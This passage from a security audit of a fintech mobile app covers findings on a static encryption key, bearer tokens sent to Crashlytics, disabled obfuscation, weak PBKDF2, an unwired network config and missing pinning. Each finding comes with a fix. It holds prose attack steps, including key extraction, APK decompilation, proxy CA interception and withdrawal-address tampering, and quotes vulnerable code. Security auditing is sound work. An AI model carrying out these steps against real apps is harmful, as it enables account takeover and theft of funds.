4. **Static IV ⇒ deterministic ciphertext.** Identical plaintext always produces identical ciphertext, permitting equality-matching and dictionary attacks across all users. For registration data (email, phone, name), an attacker can precompute the ciphertext of a target's email and confirm registration by comparison.
5. **No authentication.** Raw CBC with no MAC is malleable — see [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback).

Notably, the *rest* of the codebase does this correctly. [`encryptAES`](src/utils/helpers/encryptionDecryption.tsx#L1050) and [`useEncryptDecrypt`](src/hooks/useEncryption_Decryption.tsx) both use `QuickCrypto.randomBytes(16)` for a fresh IV and a per-user server-issued key (`userInfo.sk`), with a documented `[0x01][IV][ciphertext]` wire format. `encryptForRegister` is a legacy outlier that was never brought in line.

#### Attack Scenario

1. Attacker extracts `REGISTER_KEY` from the bundle (`grep '8080808080808080'`).
2. Attacker intercepts registration traffic. Without certificate pinning ([H-03](#h-03--no-certificate-pinning-on-either-platform)), a proxy on a hostile network or a device with a user-installed CA suffices.
3. Attacker decrypts every registration payload in transit — obtaining plaintext PII (name, email, phone, address) for every user registering on that network.
4. Attacker forges arbitrary registration payloads, since possession of the key allows encryption as well as decryption. Any backend logic that treats successful decryption as proof of client authenticity is fully bypassed.
5. Offline: given a corpus of captured ciphertexts, the deterministic IV allows the attacker to group identical plaintexts and mount a confirm-the-guess attack without ever decrypting (though here decryption is available anyway).

#### Risk Impact

- **Confidentiality:** Registration PII is effectively transmitted in plaintext — the encryption provides no confidentiality against any attacker who has seen the binary.
- **Integrity:** Forged registrations; bypass of any client-authenticity assumption the backend makes.
- **Compliance:** Presenting this as "encryption" in a data-protection assessment would be inaccurate; it does not meet the Art. 32 "state of the art" bar.

#### Exploitation Possibility

**High.** Key extraction is trivial; interception requires only the absence of pinning, which is confirmed.

#### Recommended Fix

1. **Determine whether `encryptForRegister` is still used.** Static analysis shows it exported from `tools.js` with no call sites found in `src/` — if it is genuinely dead, **delete it**. Dead cryptographic code is a liability that gets resurrected.
2. **If it is used**, replace it with the correct in-house primitive:
   ```js
   import { encryptAES } from "./helpers/encryptionDecryption";
   // Per-user server-issued key, random IV, versioned wire format
   export const encryptForRegister = (msg, sk) => encryptAES(msg, sk);
   ```
   Note the bootstrapping problem: at registration time no per-user `sk` exists yet. The correct answer is **not** a shared static key — it is to rely on TLS (with pinning) for confidentiality of the registration request, and to have the server issue the `sk` *after* successful registration. Application-layer encryption with a key every client holds adds no security over TLS alone.
3. **Migrate to AES-256-GCM** for any application-layer encryption going forward (see [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback)).
4. **Add a CI check** for `createCipheriv` calls where the IV argument is not derived from `randomBytes`.

#### Best Practice Recommendation

Application-layer encryption should be reserved for cases where it adds something TLS cannot — e.g. end-to-end confidentiality past a terminating proxy, or field-level encryption at rest. Where it is used: AES-256-GCM, a fresh 96-bit random nonce per message, a per-user key never embedded in the client, and a versioned wire format (which this codebase already has, and should standardise on).

---

### C-07 — Bearer Tokens and Full Request/Response Bodies Shipped to Crashlytics

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File), CWE-201 (Insertion of Sensitive Information Into Sent Data) |
| **MASVS** | MASVS-STORAGE-2, MASVS-PRIVACY-1 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage, M4 — Insufficient Input/Output Validation |
| **File** | [src/utils/ApiService.ts:71-113](src/utils/ApiService.ts#L71-L113) |

#### Technical Explanation

The global axios error interceptor exports the complete contents of every failed API call — **including the live bearer token** — to Firebase Crashlytics and Sentry:

```ts
const handleErrorCapture = () => async (error: any) => {
  const { config, response, message } = error;
  const userInfo: any = getUserInfo();          // ← BUG: not awaited (see M-01)
  const token = await GetTokens();              // ← the live Auth0 access token

  crashlytics().log(`API Error at ${config?.url}`);
  crashlytics().setUserId(userInfo.userId ?? "unknown");
  crashlytics().setAttributes({
    endpoint:    config?.url ?? "unknown",
    method:      method ?? "unknown",
    status:      response?.status?.toString() ?? "no response",
    appName,
    environment: "development",
    response:    JSON.stringify(response?.data),   // ← full response body
    userId:      userInfo.userId ?? "unknown",
    token:       token ?? "unknown",               // ← ★ BEARER TOKEN ★
    request:     JSON.stringify(config?.data ?? {}),// ← full request body
  });

  if (["POST", "PUT"].includes(method)) {
    crashlytics().log(`Request Body: ${JSON.stringify(config?.data || {})}`);
  }
  if (config?.data)     crashlytics().log(`Request Body: ${JSON.stringify(config.data)}`);
  if (response?.data)   crashlytics().log(`Response Body: ${JSON.stringify(response.data)}`);
  if (message)          crashlytics().log(`Message: ${message}`);
  if (error.stack)      crashlytics().log(`Stack Trace: ${error.stack}`);

  logApiErrorToSentry(error);      // ← duplicates request+response body into Sentry
  crashlytics().recordError(error);
```

And in `logApiErrorToSentry` ([:25-54](src/utils/ApiService.ts#L25-L54)):
```ts
scope.setExtra('Request Body',  config?.data);
scope.setExtra('Response Data', response?.data);
```

The request/response bodies are logged **three times** in Crashlytics (once as an attribute, twice as logs) and once more in Sentry.

**What is actually in these bodies.** Given the service layer, a failed call can carry:
- **Card operations** — `cardId`, `cardNumber`, PIN-retrieval responses ([src/screens/Tlv_Cards/showPin.tsx](src/screens/Tlv_Cards/showPin.tsx), [CardDetails.tsx:184-192](src/screens/Tlv_Cards/CardDetails.tsx#L184-L192)), CVV and expiry ([CardDetails.tsx:131-140](src/screens/Tlv_Cards/CardDetails.tsx#L131-L140))
- **Crypto withdrawals** — `walletAddress`, `amount`, `payeeId` ([src/utils/idempotency.ts:1128](src/utils/idempotency.ts#L1128))
- **Password change** — the encrypted new password ([src/screens/Profile/ChangePassword.tsx:59](src/screens/Profile/ChangePassword.tsx#L59)), which given [H-01](#h-01--pbkdf2-with-10-iterations) is weakly protected
- **KYC/PII** — the entire `addKycInfomation` and `editprofile` payloads
- **`crashlytics().setCrashlyticsCollectionEnabled(true)`** is called unconditionally at [ApiService.ts:200-203](src/utils/ApiService.ts#L200-L203), so collection is always on, in every build, with no user consent gate.

Crucially, **Crashlytics attributes and logs are not treated as secrets** by Firebase. They are visible in the Firebase console to every project member, retained for 90 days, and exportable to BigQuery.

#### Attack Scenario

**Scenario A — Insider / broad console access.** Any developer, contractor, or support engineer with Firebase console access to `exchangapay-tst-f570a` reads live bearer tokens from crash reports. They replay a token against the API and act as that customer for the token's remaining lifetime (24h per the `expiresIn: 86400` observed in C-04). Since the token is a bearer credential with no proof-of-possession, no device binding, and no replay detection ([VAPT-06](#vapt-06--token-replay)), this is a complete account takeover.

**Scenario B — Sentry token pivot.** Chaining with [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository): the committed Sentry auth token grants read access to the same request/response bodies. An external attacker with repo access reaches production customer data without ever touching a device.

**Scenario C — Third-party processor exposure.** Card PANs and CVVs transiting to Google (Crashlytics) and Functional Software (Sentry) as unstructured log text is a **direct PCI-DSS violation** — cardholder data must not be stored post-authorisation, and CVV/CVV2 must never be stored after authorisation under any circumstances (PCI-DSS Req. 3.2).

#### Risk Impact

- **Confidentiality:** Live session tokens, card data, wallet addresses, and PII exported to two external processors and readable by anyone with console access.
- **Compliance:** PCI-DSS Req. 3.2 (SAD storage) and Req. 3.4; GDPR Art. 5(1)(c) data minimisation and Art. 32.
- **Account takeover:** Direct, no further exploitation required.

#### Exploitation Possibility

**High.** Requires only Firebase or Sentry access — which, per C-02, is obtainable from the repository.

#### Recommended Fix

1. **Remove `token` from `setAttributes` immediately.** There is no legitimate diagnostic use for a bearer token in a crash report.
2. **Stop logging request and response bodies wholesale.** Replace with a strict allow-list of non-sensitive diagnostic fields:
   ```ts
   const SAFE_KEYS = new Set(["traceId", "errorCode", "correlationId"]);
   const redact = (o: any) =>
     isRecord(o) ? Object.fromEntries(
       Object.entries(o).map(([k, v]) => [k, SAFE_KEYS.has(k) ? v : "[REDACTED]"])
     ) : "[REDACTED]";
   ```
3. **Never log** any field matching `/pass|pin|cvv|cvc|card|token|secret|otp|sk|ssn|dob|address|phone|email/i`. Implement this as a shared scrubber used by *both* the Crashlytics and Sentry paths.
4. **Configure Sentry's `beforeSend`** to run the same scrubber, and set `sendDefaultPii: false` (see [H-08](#h-08--sentry-session-replay-and-pii-collection-enabled)).
5. **Gate `setCrashlyticsCollectionEnabled` on explicit user consent**, and default it to `false` until consent is given.
6. **Purge existing data.** Delete affected Crashlytics/Sentry data and rotate any tokens that appear in it — assume all tokens logged to date are compromised.
7. **Fix the un-awaited `getUserInfo()`** (see [M-01](#m-01--getuserinfo-is-never-awaited-in-the-error-interceptor)) — as written, `userInfo.userId` reads a property off a `Promise`, which is `undefined`, so `setUserId` always records `"unknown"` *and* the line `crashlytics().setUserId(userInfo.userId ?? "unknown")` will throw if `getUserInfo()` ever returns `null`… except it cannot, because it returns a Promise. The bug currently masks itself.

#### Best Practice Recommendation

Treat telemetry as a **public data sink**. Adopt an explicit allow-list model — log only what has been deliberately approved as non-sensitive — and enforce it with a single, unit-tested scrubbing function that every telemetry path must route through. Add a CI test asserting the scrubber redacts a fixture payload containing each sensitive key.

---

### C-08 — ProGuard/R8 Disabled, No Code Obfuscation

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** (in context — it is the force multiplier for C-01, C-04, C-06) |
| **CWE** | CWE-656 (Reliance on Security Through Obscurity — inverted: total absence of any barrier), CWE-1300 |
| **MASVS** | MASVS-RESILIENCE-3, MASVS-RESILIENCE-4 |
| **OWASP Mobile Top 10** | M7 — Insufficient Binary Protections |
| **Files** | [android/app/build.gradle:76](android/app/build.gradle#L76), [android/app/proguard-rules.pro](android/app/proguard-rules.pro) |

#### Technical Explanation

```gradle
/**
 * Set this to true to Run Proguard on Release builds to minify the Java bytecode.
 */
def enableProguardInReleaseBuilds = false
```

and the entire contents of `proguard-rules.pro`:

```
# Add project specific ProGuard rules here.
# ...
# Add any project specific keep options here:
```

— i.e. **no rules at all**. Consequently:

- Java/Kotlin bytecode ships fully symbolised — all class, method, and field names intact.
- No resource shrinking (`shrinkResources` is not set), so the APK carries unused resources.
- No control-flow obfuscation, string encryption, or class-name mangling.
- The Hermes JS bundle is bytecode-compiled but **not obfuscated** — string literals survive verbatim, which is exactly how C-01, C-04, and C-06 are extracted.
- There is no separate JS-layer protection (`metro-minify-terser` with mangling, `react-native-obfuscating-transformer`, or equivalent).

On iOS, the situation is comparable: Swift/ObjC symbols are stripped in Release by default, but the `main.jsbundle` is unprotected in the same way.

#### Attack Scenario

1. `apktool d exchangapay.apk` → readable smali with original identifiers; `jadx` produces near-source Java.
2. `hermes-dec` or `hbctool` on `assets/index.android.bundle` → recoverable JS structure with all string literals.
3. From there, every other finding in this report becomes materially easier:
   - Secrets (C-01, C-02 DSN, C-04 JWT, C-06 key) fall out of a `strings` pass.
   - Business logic — fee calculation, idempotency-key derivation ([M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)), the client-side KYC gating in `useMemberLogin` — is fully readable and therefore fully attackable.
   - Patching is straightforward: flip `isKYC`, remove the biometric prompt ([H-14](#h-14--biometric-gate-is-client-side-navigation-only)), or rewrite the withdrawal `walletAddress`. Combined with [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), the patched build can then be **signed with the known debug key** and installed as a legitimate update.
4. Frida/Objection hooking is unimpeded — no root detection ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)), no debugger detection, no integrity self-check.

#### Risk Impact

- **Intellectual property:** Complete disclosure of proprietary fee, limit, and transaction logic.
- **Security-in-depth:** Removes the last barrier between an attacker and every hardcoded secret in the app.
- **Tamper resistance:** Zero. Repackaging is a routine operation.

#### Exploitation Possibility

**Trivial.** Standard, freely available tooling; no skill barrier.

#### Recommended Fix

1. **Enable R8 in release builds:**
   ```gradle
   def enableProguardInReleaseBuilds = true

   buildTypes {
       release {
           signingConfig signingConfigs.release   // per C-03
           minifyEnabled true
           shrinkResources true
           proguardFiles getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro"
       }
   }
   ```
2. **Populate `proguard-rules.pro`.** RN 0.83 + this dependency set requires keeps for React Native core, Hermes, Firebase, Sumsub, VisionCamera, Reanimated/Worklets, and the Keychain module. Start from:
   ```proguard
   # React Native
   -keep,allowobfuscation @interface com.facebook.proguard.annotations.DoNotStrip
   -keep,allowobfuscation @interface com.facebook.proguard.annotations.KeepGettersAndSetters
   -keep @com.facebook.proguard.annotations.DoNotStrip class *
   -keepclassmembers class * { @com.facebook.proguard.annotations.DoNotStrip *; }
   -keepclassmembers class *  { @com.facebook.react.uimanager.annotations.ReactProp <methods>; }
   -keep class com.facebook.hermes.** { *; }
   -keep class com.facebook.jni.** { *; }

   # Firebase / Crashlytics
   -keepattributes SourceFile,LineNumberTable
   -keep class com.google.firebase.** { *; }

   # Sumsub
   -keep class com.sumsub.** { *; }

   # Keychain / Auth0 / VisionCamera / Reanimated
   -keep class com.oblador.keychain.** { *; }
   -keep class com.auth0.** { *; }
   -keep class com.mrousavy.camera.** { *; }
   -keep class com.swmansion.** { *; }

   # Strip all logging from release builds
   -assumenosideeffects class android.util.Log { public static *** d(...); public static *** v(...); public static *** i(...); }
   ```
   Then **test the release build end-to-end** — R8 without correct keeps causes runtime `ClassNotFoundException` in native modules, which is precisely why it is often left disabled. Budget time for this; it is not a one-line change.
3. **Obfuscate the JS layer.** Add a Metro minifier with identifier mangling for release builds; consider `react-native-obfuscating-transformer` for the sensitive modules specifically.
4. **Upload mapping files** to Crashlytics/Sentry so stack traces remain readable internally (`firebaseCrashlytics { mappingFileUploadEnabled true }`).
5. **Recognise the ordering:** obfuscation raises cost, it does not create secrecy. Fix C-01/C-04/C-06 by *removing the secrets*; use R8 as defence-in-depth on top, never as the primary control.

#### Best Practice Recommendation

Ship release builds through a hardening pipeline: R8 with optimisation + resource shrinking, JS minification with mangling, native symbol stripping, mapping-file upload to your crash reporter, and — for a fintech app of this profile — a commercial RASP/anti-tamper layer (e.g. Appdome, Guardsquare DexGuard/iXGuard, Promon SHIELD) providing integrity self-checks, debugger/hook detection, and repackaging detection. Pair with server-side Play Integrity / App Attest verdicts so tampering is detectable even when client-side checks are defeated.

---

## 3. High Findings

---

### H-01 — PBKDF2 With 10 Iterations Protecting Password Changes

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-916 (Use of Password Hash With Insufficient Computational Effort), CWE-326 (Inadequate Encryption Strength) |
| **MASVS** | MASVS-CRYPTO-1 |
| **OWASP Mobile Top 10** | M10 — Insufficient Cryptography |
| **Files** | [src/utils/helpers/index.tsx:674-703](src/utils/helpers/index.tsx#L674-L703), consumed at [src/screens/Profile/ChangePassword.tsx:59](src/screens/Profile/ChangePassword.tsx#L59) |

#### Technical Explanation

```ts
const PBKDF2_ITERATIONS = 10;      // ← ten
const PBKDF2_KEY_BYTES  = 32;
const PBKDF2_DIGEST     = "sha256";

export const encryptValue = (msg: any, key: any) => {
    const salt       = QuickCrypto.randomBytes(16);
    const derivedKey = QuickCrypto.pbkdf2Sync(key, salt, PBKDF2_ITERATIONS, PBKDF2_KEY_BYTES, PBKDF2_DIGEST);
    const iv         = QuickCrypto.randomBytes(16);
    const cipher     = QuickCrypto.createCipheriv("aes-256-cbc", derivedKey, iv);
    const encrypted  = Buffer.concat([cipher.update(text, "utf8"), cipher.final()]);
    return Buffer.from(salt).toString("hex") + Buffer.from(iv).toString("hex") + encrypted.toString("base64");
};
```

The only call site is the **change-password flow**:

```tsx
// src/screens/Profile/ChangePassword.tsx:59
const password = value?.newPassword && encryptValue(value.newPassword, sk) || '';
```

**10 iterations** of PBKDF2-HMAC-SHA256 is approximately **10,000× below** the OWASP 2023 minimum of 600,000 for SHA-256, and roughly 400,000× below what modern hardware can comfortably afford. On a commodity GPU, PBKDF2-SHA256 at 10 iterations runs at effectively the speed of raw SHA-256 — on the order of 10⁹–10¹⁰ candidate keys per second.

The salt and IV are correctly random and correctly prefixed to the output, and the format is documented as byte-compatible with the previous `crypto-js` implementation — so the migration to native crypto was done carefully. The iteration count, however, was carried over from whatever the legacy code used, and 10 is not a defensible number.

Note the mitigating context: the *input* to the KDF is `sk` (the server-issued per-user secret key), not the user's password — the password is the *plaintext being encrypted*. So this is not password hashing; it is key derivation from an already-high-entropy secret. That materially reduces, but does not eliminate, the concern:

- If `sk` is genuinely high-entropy (16/24/32 random bytes, per the `normalizeSecretKey` length check), brute-forcing the derived key via the KDF is not the weak point — attacking `sk` directly is.
- **But** `sk` is stored in the Keychain as part of a JSON blob ([src/hooks/useMemberLogin.tsx:72-79](src/hooks/useMemberLogin.tsx#L72-L79)) with default accessibility ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)), is held in the Redux store, and is persisted via redux-persist with **encryption disabled** ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)). Its confidentiality is not strong.
- A low iteration count means that *if* `sk` is ever partially known, guessable, or drawn from a constrained space, the KDF provides essentially no work factor to slow an offline attack on the encrypted password.

#### Attack Scenario

1. Attacker obtains the ciphertext of a password-change request — from a network capture without pinning ([H-03](#h-03--no-certificate-pinning-on-either-platform)), from Crashlytics logs ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), since the change-password payload is logged on failure), or from device storage.
2. The salt and IV are prefixed to the ciphertext in the clear (by design), so the attacker needs only `sk`.
3. Attacker recovers `sk` from an unlocked/compromised device (Keychain with default accessibility is readable when the device is unlocked; on a jailbroken/rooted device it is readable outright — and there is no root detection).
4. With 10 iterations, deriving the key and decrypting is instantaneous. The user's **plaintext new password** is recovered.
5. Given typical password reuse, this yields credentials for the victim's email and other financial services.

#### Risk Impact

- **Confidentiality:** Plaintext password recovery given `sk`, with negligible computational cost.
- **Credential stuffing:** Recovered passwords are reusable against other services.
- **Compliance:** Falls short of "state of the art" cryptographic protection under GDPR Art. 32 and of PCI-DSS Req. 8 password-protection expectations.

#### Exploitation Possibility

**Medium.** Requires obtaining both the ciphertext and `sk`. Both are achievable given the other findings, but it is a two-step chain rather than a single trivial step.

#### Recommended Fix

1. **Raise the iteration count to the OWASP 2023 minimum** for PBKDF2-HMAC-SHA256:
   ```ts
   const PBKDF2_ITERATIONS = 600_000;
   ```
   Because `QuickCrypto.pbkdf2Sync` runs natively (not on the JS thread), 600k iterations costs roughly 200–400 ms on a mid-range device — acceptable for a once-per-flow password change, but **measure it** and move to the async `pbkdf2` variant if it blocks the UI.
2. **Version the wire format.** The current output is `salt(hex) || iv(hex) || base64(ct)` with no version marker, so the backend cannot distinguish iteration counts. Add a prefix byte or a `v2:` marker (the codebase already uses this pattern in [encryptionDecryption.tsx](src/utils/helpers/encryptionDecryption.tsx#L992)) and **coordinate the change with the backend team** — this is a breaking change to a shared format.
3. **Prefer Argon2id** for any new key-derivation work (`argon2id`, m=19 MiB, t=2, p=1 per OWASP), which resists GPU attack far better than PBKDF2.
4. **Reconsider the design.** Encrypting a password client-side before transmission adds little over TLS — the server must still receive something it can verify. If the backend simply decrypts and then hashes, the client-side encryption is decorative. Confirm what the backend does with this field; if it decrypts to plaintext, the correct fix is to send the password over pinned TLS and hash it server-side with Argon2id.
5. **Add `AES-256-GCM`** instead of CBC here as well (see [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback)).

#### Best Practice Recommendation

Pin KDF parameters in a single constants module with a comment recording the standard and date they were chosen against, and add a scheduled review (annually) to raise them as hardware improves. Never carry a parameter forward from legacy code without re-justifying it.

---

### H-02 — `network_security_config.xml` Exists But Is Never Wired Into the Manifest

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-1188 (Insecure Default Initialization), CWE-319 (Cleartext Transmission) |
| **MASVS** | MASVS-NETWORK-1 |
| **OWASP Mobile Top 10** | M5 — Insecure Communication |
| **Files** | [android/app/src/main/res/xml/network_security_config.xml](android/app/src/main/res/xml/network_security_config.xml), [android/app/src/main/AndroidManifest.xml:14](android/app/src/main/AndroidManifest.xml#L14) |

#### Technical Explanation

A correct, well-formed network security configuration exists:

```xml
<!-- android/app/src/main/res/xml/network_security_config.xml -->
<network-security-config>
  <base-config cleartextTrafficPermitted="false">
    <trust-anchors>
      <certificates src="system" />
    </trust-anchors>
  </base-config>
</network-security-config>
```

This is exactly right: cleartext disabled, and — importantly — **`src="system"` only**, which excludes user-installed CAs and would defeat casual Burp/mitmproxy interception.

But the `<application>` tag never references it:

```xml
<application android:name=".MainApplication"
             android:label="@string/app_name"
             android:icon="@mipmap/ic_launcher"
             android:roundIcon="@mipmap/ic_launcher_round"
             android:allowBackup="false"
             android:theme="@style/AppTheme"
             android:supportsRtl="true">
    <!-- no android:networkSecurityConfig attribute -->
```

**The file is inert.** Android only applies a network security config when it is declared via `android:networkSecurityConfig="@xml/network_security_config"`. Without that attribute, the platform default applies:

- `targetSdkVersion 35` → `cleartextTrafficPermitted` defaults to **false** (good, since API 28), so cleartext is still blocked.
- **But the trust anchors revert to the platform default: `system` + `user`.** Any CA the user (or an attacker with device access, or an MDM profile, or malware) installs is trusted for all app traffic.

The practical consequence is that the one control that would have made interception meaningfully harder is switched off by omission. This directly enables [H-03](#h-03--no-certificate-pinning-on-either-platform) and every MITM scenario in this report.

Separately, [android/app/src/debug/AndroidManifest.xml](android/app/src/debug/AndroidManifest.xml) sets `android:usesCleartextTraffic="true"` — correct scoping (debug-only, and it does not merge into release), but worth noting it means debug builds have no transport protection at all.

#### Attack Scenario

1. Attacker installs a CA certificate on the target device — via social engineering ("install this profile for corporate Wi-Fi"), a malicious MDM enrolment, physical access, or malware.
2. Because user CAs are trusted (no config applied, no pinning), the attacker proxies all app traffic and reads/modifies it in full: bearer tokens, KYC payloads, card data, withdrawal requests.
3. On a rooted device (undetected — [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)) the CA can be placed in the system store directly, requiring no user interaction at all.
4. The attacker modifies a withdrawal request in flight, substituting `walletAddress` — the request is re-signed by nothing, and the idempotency key ([M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)) is a non-cryptographic hash the attacker can recompute.

#### Risk Impact

- **Confidentiality & Integrity:** Full read/write access to the authenticated API session for any attacker who can place a CA on the device.
- **Financial:** Direct fund-redirection path on the crypto withdrawal flow.

#### Exploitation Possibility

**High** on a device the attacker has any influence over; **Medium** in a broad-population attack (requires per-device CA placement).

#### Recommended Fix

1. **Wire the config in** — one attribute:
   ```xml
   <application
       android:name=".MainApplication"
       android:networkSecurityConfig="@xml/network_security_config"
       android:allowBackup="false"
       ... >
   ```
2. **Extend the config with certificate pinning** (see [H-03](#h-03--no-certificate-pinning-on-either-platform)) once backup pins are established:
   ```xml
   <network-security-config>
     <base-config cleartextTrafficPermitted="false">
       <trust-anchors><certificates src="system" /></trust-anchors>
     </base-config>
     <domain-config>
       <domain includeSubdomains="true">api.exchangapay.com</domain>
       <pin-set expiration="2027-06-01">
         <pin digest="SHA-256">BASE64_LEAF_OR_INTERMEDIATE_SPKI_HASH</pin>
         <pin digest="SHA-256">BASE64_BACKUP_SPKI_HASH</pin>
       </pin-set>
     </domain-config>
     <!-- Allow user CAs in debug only, so the security team can still test -->
     <debug-overrides>
       <trust-anchors><certificates src="user" /><certificates src="system" /></trust-anchors>
     </debug-overrides>
   </network-security-config>
   ```
3. **Add a build-time assertion** (a Gradle check or a lint rule) that fails if `android:networkSecurityConfig` is absent from the release manifest — this is exactly the kind of silent omission that recurs.
4. **Verify with a real test:** install a proxy CA on a test device and confirm the app's requests now fail. A config that is present but wrong is indistinguishable from one that is absent, unless you test it.

#### Best Practice Recommendation

Security configuration files should be validated by an automated test, not by inspection. Add an instrumentation test that asserts a connection through a proxy CA is rejected, and run it in CI on every release build.

---

### H-03 — No Certificate Pinning on Either Platform

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-295 (Improper Certificate Validation) |
| **MASVS** | MASVS-NETWORK-2 |
| **OWASP Mobile Top 10** | M5 — Insecure Communication |
| **Scope** | All API clients: [src/utils/ApiService.ts](src/utils/ApiService.ts), [src/utils/api.tsx](src/utils/api.tsx), [src/services/chatService.js](src/services/chatService.js), [src/services/crypto.tsx:92](src/services/crypto.tsx#L92) |

#### Technical Explanation

A repository-wide search for pinning constructs (`pin-sha256`, `CertificatePinner`, `sslPinning`, `publicKeyHash`, `NSPinnedDomains`, `TrustKit`) returns **no matches in application code** — the only hits are inside bundled OkHttp classes in `android/app/build/`, i.e. the library's own unused implementation.

Every network path is unpinned:

| Client | Base URL | Library | Pinned? |
|---|---|---|---|
| `api` (primary) | `https://tstapi.exchangapay.com/` (via C-05) | apisauce/axios | ❌ |
| `uploadapi` | same | apisauce/axios | ❌ |
| `cardApi`, `uploadapi` (legacy) | `https://api.exchangapay.com/` | apisauce | ❌ |
| `transactionApi` | `https://neowalletgrid.azurewebsites.net/` | apisauce | ❌ |
| `transactionBankApi` | `https://neobank.azurewebsites.net/` | apisauce | ❌ |
| `authApi` | `https://tstlogin.suissebase.io` | apisauce | ❌ |
| `api` (legacy) | `https://neowalletapi.azurewebsites.net/` | apisauce | ❌ |
| `marketApi` / `coingico` | `https://api.coingecko.com/` | apisauce | ❌ |
| Kommo chat | `https://amojo.kommo.com` | axios + `fetch` | ❌ |
| 2FA WebView | server-supplied URL | react-native-webview | ❌ |
| IP lookup | `https://ipinfo.io/json` | `fetch` | ❌ |
| Sumsub SDK | vendor-managed | native SDK | vendor default |

Note the raw `fetch` and bare `axios` calls ([src/services/chatService.js:206](src/services/chatService.js#L206), [src/services/crypto.tsx:92](src/services/crypto.tsx#L92), [src/navigation/AppContainer.tsx:130](src/navigation/AppContainer.tsx#L130)) bypass even the shared axios instance, so any interceptor-based mitigation would not cover them.

Combined with [H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest) (user CAs trusted on Android) and the iOS ATS config which sets `NSAllowsArbitraryLoads: false` but declares **no `NSPinnedDomains`**, the app has no defence against a locally-trusted interception proxy on either platform.

#### Attack Scenario

**Scenario A — Hostile network + CA placement.** As per H-02: place a CA, proxy everything. Applies to public Wi-Fi with a captive portal that prompts for a certificate, corporate MDM, or an attacker with brief physical access.

**Scenario B — Compromised CA / mis-issuance.** A publicly trusted CA is compromised or mis-issues a certificate for `*.exchangapay.com`. Without pinning, the app accepts it. This is the specific threat pinning exists to address, and it has occurred repeatedly in practice (DigiNotar, TÜRKTRUST, Symantec).

**Scenario C — Security researcher / attacker analysis.** No pinning means the entire API surface is trivially mappable with Burp Suite on a test device, exposing undocumented endpoints, parameter structures, and error behaviour for offline attack development.

**Scenario D — The Azure endpoints.** `neowalletgrid.azurewebsites.net`, `neobank.azurewebsites.net`, and `neowalletapi.azurewebsites.net` are **generic Azure App Service hostnames** on a shared, wildcard-covered domain. These warrant particular scrutiny: `*.azurewebsites.net` certificates are Microsoft-issued for the shared platform, and subdomain-takeover risk applies if any of these app services is ever deprovisioned while the client still points at it. See [L-04](#l-04--stale-hardcoded-azure-and-third-party-api-endpoints).

#### Risk Impact

- **Confidentiality:** Full session disclosure including bearer tokens, card data, KYC PII.
- **Integrity:** Request tampering — the withdrawal-redirection scenario is the highest-value target.
- **Analysis enablement:** Removes the barrier to systematic API reconnaissance.

#### Exploitation Possibility

**Medium-High.** Scenario A is routine for a motivated attacker targeting an individual; Scenario C is available to anyone immediately.

#### Recommended Fix

1. **Android — declarative pinning** via the network security config (see the H-02 fix). This is the lowest-effort, highest-coverage option because it applies at the platform layer and therefore covers OkHttp, axios/fetch (which use OkHttp under the hood in RN), and the WebView.
2. **iOS — ATS pinning** in `Info.plist`:
   ```xml
   <key>NSAppTransportSecurity</key>
   <dict>
     <key>NSAllowsArbitraryLoads</key><false/>
     <key>NSPinnedDomains</key>
     <dict>
       <key>api.exchangapay.com</key>
       <dict>
         <key>NSIncludesSubdomains</key><true/>
         <key>NSPinnedCAIdentities</key>
         <array>
           <dict><key>SPKI-SHA256-BASE64</key><string>BASE64_SPKI_HASH</string></dict>
           <dict><key>SPKI-SHA256-BASE64</key><string>BACKUP_SPKI_HASH</string></dict>
         </array>
       </dict>
     </dict>
   </dict>
   ```
3. **Pin the intermediate or the SPKI, not the leaf.** Leaf pinning breaks on every certificate renewal (every 90 days with Let's Encrypt / ACME). Pin the intermediate CA's SPKI, and **always ship at least one backup pin** for a key you control but have not yet deployed.
4. **Set a pin expiry** (`expiration` attribute on Android) so a stale pin degrades to normal validation rather than bricking the app.
5. **Plan the failure mode.** A bad pin ships an app that cannot reach the API and cannot be fixed without a store update. Mitigate with: staged rollout, a server-driven kill-switch (you already have `neoMobileVersioncheck` — extend it), and backup pins.
6. **Consolidate network clients first.** Pinning nine separate base URLs across three HTTP libraries is unmanageable. Route everything through the single `ApiService` axios instance (see [M-03](#m-03--no-request-timeouts-or-retry-policy)), then pin once.

#### Best Practice Recommendation

Pin only the domains you control (`*.exchangapay.com`). Do not pin third parties (CoinGecko, Kommo, ipinfo.io) — you cannot coordinate their key rotation. For those, rely on standard TLS validation plus the `system`-only trust anchor setting, which already excludes user CAs.

---

### H-04 — No Root/Jailbreak Detection or Device Attestation

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-919 (Weaknesses in Mobile Applications), CWE-693 (Protection Mechanism Failure) |
| **MASVS** | MASVS-RESILIENCE-1, MASVS-RESILIENCE-2 |
| **OWASP Mobile Top 10** | M7 — Insufficient Binary Protections |
| **Scope** | Application-wide — no implementation found |

#### Technical Explanation

A repository-wide search for `jailbreak`, `isRooted`, `rootBeer`, `SafetyNet`, `Play Integrity`, `DeviceCheck`, `App Attest`, `isEmulator`, and `attest` returns **no application-code matches**.

